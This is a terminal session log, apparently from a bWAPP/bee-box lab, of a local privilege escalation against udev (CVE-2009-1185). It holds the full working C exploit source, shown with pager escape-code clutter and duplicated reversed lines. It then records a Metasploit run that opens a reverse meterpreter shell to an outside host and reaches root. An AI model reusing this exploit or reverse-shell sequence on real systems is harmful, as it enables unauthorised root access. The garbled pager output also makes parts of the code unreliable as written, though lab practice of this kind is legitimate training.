+ *   95-udev-late.rules functionality that is meant to run arbitrary commands 
+ *   when a device is removed.  A bit cleaner and reliable as long as your 
+ *   distro ships that rule file.
+ *
+ *   Tested on Gentoo, Intrepid, and Jaunty.
+ *
+ * Usage:
+ *
+ *   Pass the PID of the udevd netlink socket (listed in /proc/net/netlink, 
+ *   usually is the udevd PID minus 1) as argv[1].
+ *
+ *   The exploit will execute /tmp/run as root so throw whatever payload you 
+ *   want in there.
+ */
+
+[7mcve-2009-1185.c[27m[K[K [KESCESC[KOO[KBB[K#include <stdio.h>
+:[K[K [KESCESC[KOO[KBB[K#include <string.h>
+:[K[K [KESCESC[KOO[KBB[K#include <stdlib.h>
+:[K[K [KESCESC[KOO[KBB[K#include <unistd.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/types.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/stat.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/socket.h>
+:[K[K [KESCESC[KOO[KBB[K#include <linux/types.h>
+:[K[K [KESCESC[KOO[KBB[K#include <linux/netlink.h>
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K#ifndef NETLINK_KOBJECT_UEVENT
+:[K[K [KESCESC[KOO[KBB[K#define NETLINK_KOBJECT_UEVENT 15
+:[K[K [KESCESC[KOO[KBB[K#endif
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[Kint
+:[K[K [KESCESC[KOO[KAA[K[HM *
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *   a NETLINK message from user space.
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *   from kernel space, which allows local users to gain privileges by sending 
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *   udev before 1.4.1 does not verify whether a NETLINK message originates 
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1185
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM * Information:
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM * http://jon.oberheide.org
+[34;1H[K:[K[K [KESCESC[KOO[KBB[K#include <sys/stat.h>
+:[K[K [KESCESC[KOO[KAA[K[HM * http://jon.oberheide.org
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM * Jon Oberheide <jon@oberheide.org>
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM * udev < 141 Local Privilege Escalation Exploit
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM *
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM * cve-2009-1185.c
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM/*
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KAA[K[K:[K[K [KESCESC[KOO[KBB[K#include <stdio.h>
+:[K[K [KESCESC[KOO[KBB[K#include <string.h>
+:[K[K [KESCESC[KOO[KBB[K#include <stdlib.h>
+:[K[K [KESCESC[KOO[KBB[K#include <unistd.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/types.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/stat.h>
+:[K[K [KESCESC[KOO[KBB[K#include <sys/socket.h>
+:[K[K [KESCESC[KOO[KBB[K#include <linux/types.h>
+:[K[K [KESCESC[KOO[KBB[K#include <linux/netlink.h>
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K#ifndef NETLINK_KOBJECT_UEVENT
+:[K[K [KESCESC[KOO[KBB[K#define NETLINK_KOBJECT_UEVENT 15
+:[K[K [KESCESC[KOO[KBB[K#endif
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[Kint
+:[K[K [KESCESC[KOO[KBB[Kmain(int argc, char **argv)
+:[K[K [KESCESC[KOO[KBB[K{
+:[K[K [KESCESC[KOO[KBB[K        int sock;
+:[K[K [KESCESC[KOO[KBB[K        char *mp, *err;
+:[K[K [KESCESC[KOO[KBB[K        char message[4096];
+:[K[K [KESCESC[KOO[KBB[K        struct stat st;
+:[K[K [KESCESC[KOO[KBB[K        struct msghdr msg;
+:[K[K [KESCESC[KOO[KBB[K        struct iovec iovector;
+:[K[K [KESCESC[KOO[KBB[K        struct sockaddr_nl address;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        if (argc < 2) {
+:[K[K [KESCESC[KOO[KBB[K                err = "Pass the udevd netlink PID as an argument";
+:[K[K [KESCESC[KOO[KBB[K                printf("[-] Error: %s\n", err);
+:[K[K [KESCESC[KOO[KBB[K                exit(1);
+:[K[K [KESCESC[KOO[KBB[K        }
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        if ((stat("/etc/udev/rules.d/95-udev-late.rules", &st) == -1) &&
+:[K[K [KESCESC[KOO[KBB[K            (stat("/lib/udev/rules.d/95-udev-late.rules", &st) == -1)) {
+:[K[K [KESCESC[KOO[KBB[K                err = "Required 95-udev-late.rules not found";
+:[K[K [KESCESC[KOO[KBB[K                printf("[-] Error: %s\n", err);
+:[K[K [KESCESC[KOO[KBB[K                exit(1);
+:[K[K [KESCESC[KOO[KBB[K        }
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        if (stat("/tmp/run", &st) == -1) {
+:[K[K [KESCESC[KOO[KBB[K                err = "/tmp/run does not exist, please create it";
+:[K[K [KESCESC[KOO[KBB[K                printf("[-] Error: %s\n", err);
+:[K[K [KESCESC[KOO[KBB[K                exit(1);
+:[K[K [KESCESC[KOO[KBB[K        }
+:[K[K [KESCESC[KOO[KBB[K        system("chmod +x /tmp/run");
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        memset(&address, 0, sizeof(address));
+:[K[K [KESCESC[KOO[KBB[K        address.nl_family = AF_NETLINK;
+:[K[K [KESCESC[KOO[KBB[K        address.nl_pid = atoi(argv[1]);
+:[K[K [KESCESC[KOO[KBB[K        address.nl_groups = 0;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_name = (void*)&address;
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_namelen = sizeof(address);
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_iov = &iovector;
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_iovlen = 1;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+:[K[K [KESCESC[KOO[KBB[K        bind(sock, (struct sockaddr *) &address, sizeof(address));
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        mp = message;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "remove@/d") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "SUBSYSTEM=block") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "TIMEOUT=10") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "ACTION=remove") +1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        iovector.iov_base = (void*)message;
+:[K[K [KESCESC[KOO[KBB[K        iovector.iov_len = (int)(mp-message);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        sendmsg(sock, &msg, 0);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        close(sock);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        return 0;
+:[K[K [KESCESC[KOO[KAA[K[HM                printf("[-] Error: %s\n", err);
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                err = "/tmp/run does not exist, please create it";
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        if (stat("/tmp/run", &st) == -1) {
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        }
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                exit(1);
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                printf("[-] Error: %s\n", err);
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                err = "Required 95-udev-late.rules not found";
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM            (stat("/lib/udev/rules.d/95-udev-late.rules", &st) == -1)) {
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        if ((stat("/etc/udev/rules.d/95-udev-late.rules", &st) == -1) &&
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        }
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                exit(1);
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                printf("[-] Error: %s\n", err);
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM                err = "Pass the udevd netlink PID as an argument";
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        if (argc < 2) {
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        struct sockaddr_nl address;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        struct iovec iovector;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        struct msghdr msg;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        struct stat st;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        char message[4096];
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        char *mp, *err;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM        int sock;
+[34;1H[K:[K[K [KESCESC[KOO[KAA[K[HM{
+[34;1H[K:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_name = (void*)&address;
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_namelen = sizeof(address);
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_iov = &iovector;
+:[K[K [KESCESC[KOO[KBB[K        msg.msg_iovlen = 1;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
+:[K[K [KESCESC[KOO[KBB[K        bind(sock, (struct sockaddr *) &address, sizeof(address));
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        mp = message;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "remove@/d") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "SUBSYSTEM=block") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "DEVPATH=/dev/foo") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "TIMEOUT=10") + 1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "ACTION=remove") +1;
+:[K[K [KESCESC[KOO[KBB[K        mp += sprintf(mp, "REMOVE_CMD=/tmp/run") +1;
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        iovector.iov_base = (void*)message;
+:[K[K [KESCESC[KOO[KBB[K        iovector.iov_len = (int)(mp-message);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        sendmsg(sock, &msg, 0);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        close(sock);
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K        return 0;
+:[K[K [KESCESC[KOO[KBB[K}
+:[K[K [KESCESC[KOO[KBB[K
+:[K[K [KESCESC[KOO[KBB[K// milw0rm.com [2009-04-30]
+[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K [KESCESC[KOO[KBB[K[K[7m(END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:48570 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> search udev
+[0m
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/linux/local/[45mudev[0m_netlink  2009-04-16       [32mgreat[0m  No     Linux [45mudev[0m Netlink Local Privilege Escalation
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/linux/local/udev_netlink
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> l[Kshow options 
+[0m
+Module options (exploit/linux/local/udev_netlink):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION                      yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> set session 1
+[0msession => 1
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> show options 
+[0m
+Module options (exploit/linux/local/udev_netlink):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   NetlinkPID                   no        Usually udevd pid-1.  Meterpreter sessions will autodetect
+   SESSION     1                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> ex[[Kploit 
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+[1m[34m[*][0m Attempting to autodetect netlink pid...
+[1m[34m[*][0m Meterpreter session, using get_processes to find netlink pid
+[1m[34m[*][0m udev pid: 2934
+[1m[32m[+][0m Found netlink pid: 2933
+[1m[34m[*][0m Writing payload executable (207 bytes) to /tmp/BeiMKMmoCH
+[1m[34m[*][0m Writing exploit executable (1879 bytes) to /tmp/xsnMGiEsil
+[1m[34m[*][0m chmod'ing and running it...
+[1m[34m[*][0m Sending stage (980808 bytes) to 10.10.10.6
+[1m[34m[*][0m Meterpreter session 2 opened (10.10.10.10:4444 -> 10.10.10.6:50045) at 2020-08-18 19:14:15 +0530
+
+[0m[4mmeterpreter[0m > [0msessions 
+[0mUsage: sessions <id>
+
+Interact with a different session Id.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 2...
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                    Connection
+  --  ----  ----                   -----------                                                    ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box                                        10.10.10.10:4444 -> 10.10.10.6:48570 (10.10.10.6)
+  2         meterpreter x86/linux  no-user @ bee-box (uid=0, gid=0, euid=0, egid=0) @ 10.10.10.6  10.10.10.10:4444 -> 10.10.10.6:50045 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> sessions -i 2 
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell 
+[0mProcess 16933 created.
+Channel 1 created.
+whoami
+root
+^C
+Terminate channel 1? [y/N]  y
+[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 2...
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ fg
+msfconsole -q
+
+
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> 
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> exit
+[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
+[4mmsf5[0m exploit([1m[31mlinux/local/udev_netlink[0m) [0m> rxexit -y 
+[0m[2]-  Done                    wget --no-check-certificate https://10.10.10.6/webdav/rt_payload_1.php
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 160
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  2878 Nov  3  2014 cve-2009-1185.c
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh     2 Aug 18 19:15 rt_payload_1.php.1
+-rw-r--r-- 1 dinesh dinesh 81920 Aug 18 19:15 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+-rw-r--r-- 1 dinesh dinesh   846 Aug 18 19:15 wget-log
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ cat wget-log 
+--2020-08-18 19:10:35--  https://10.10.10.6/webdav/rt_payload_1.php
+Connecting to 10.10.10.6:443... connected.
+WARNING: The certificate of ‘10.10.10.6’ is not trusted.
+WARNING: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+WARNING: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+HTTP request sent, awaiting response... 200 OK
+Length: 2 [text/html]
+Saving to: ‘rt_payload_1.php.1’
+
+rt_payload_1.php.1                  0%[                                                             ]       0  --.-KB/s               rt_payload_1.php.1                100%[============================================================>]       2  --.-KB/s    in 0s      
+
+2020-08-18 19:15:08 (129 KB/s) - ‘rt_payload_1.php.1’ saved [2/2]
+
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ rm wget-log 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 156
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  2878 Nov  3  2014 cve-2009-1185.c
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh     2 Aug 18 19:15 rt_payload_1.php.1
+-rw-r--r-- 1 dinesh dinesh 81920 Aug 18 19:15 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ rm e[Krt_payload_1.php.1 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ ll
+total 156
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:50 01.session
+-rw-r--r-- 1 dinesh dinesh 49152 Aug 17 17:51 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:51 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6943 Aug 17 17:51 01.session.script
+-rw-r--r-- 1 dinesh dinesh  2878 Nov  3  2014 cve-2009-1185.c
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 19:04 rt_payload_1.php
+-rw-r--r-- 1 dinesh dinesh 86016 Aug 18 19:15 terminal-log_Tue_18_Aug_2020_07:02:48_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ rm cve-2009-1185.c 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ rm e[Kr[K[K[K[Krm rt_payload_1.php [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-udev[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-udev[00m] $ exit
+
+Script done on 2020-08-18 19:16:11+05:30 [COMMAND_EXIT_CODE="130"]
